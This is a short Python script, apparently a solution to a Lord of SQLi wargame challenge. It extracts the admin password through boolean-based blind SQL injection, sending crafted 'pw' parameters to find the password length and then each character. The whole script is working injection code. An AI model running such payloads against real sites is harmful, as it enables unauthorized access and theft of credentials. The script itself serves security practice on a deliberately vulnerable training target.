import requests

url = "https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php"
cookies = { "PHPSESSID" : "쿠키값" }

def pw_length():
    length = 1

    while True:
        params = { "pw" : "' || id='admin' && length(pw) = {} #".format(length) }
        request = requests.get(url, params=params, cookies=cookies)

        if "Hello admin" in request.text:
            return length
        else:
            length += 1

def pw_crack():
    password_length = pw_length()
    password = ''

    for i in range(1, password_length+1):
        for j in range(30, 123):
            params = { "pw" : "' || id='admin' && ascii(substring(pw, {}, 1))={} #".format(i, j) }
            request = requests.get(url, params=params, cookies=cookies)

            if "Hello admin" in request.text:
                password = password + chr(j)
                print("패스워드:", password)
                if len(password) == 8:
                    break

pw_crack()
